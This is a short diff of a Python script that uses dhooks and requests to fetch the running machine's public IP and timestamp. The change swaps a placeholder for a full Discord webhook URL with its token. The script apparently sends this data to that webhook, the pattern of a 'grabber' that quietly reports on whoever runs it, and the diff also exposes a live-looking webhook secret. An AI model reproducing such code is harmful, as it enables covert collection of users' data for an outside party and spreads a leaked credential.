@@ -3,7 +3,7 @@ import json
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-hook = Webhook("webhook-url-here")
+hook = Webhook("https://discord.com/api/webhooks/1508833756570451968/1HU5C4rhWXMosOSYQfYnHvSTcHXYpVQU93TxjYfUKaZyhv49hdJWxf7IyCz3KSkvfnvI")
 
 time = datetime.now().strftime("%H:%M %p")  
 ip = requests.get('https://api.ipify.org/').text
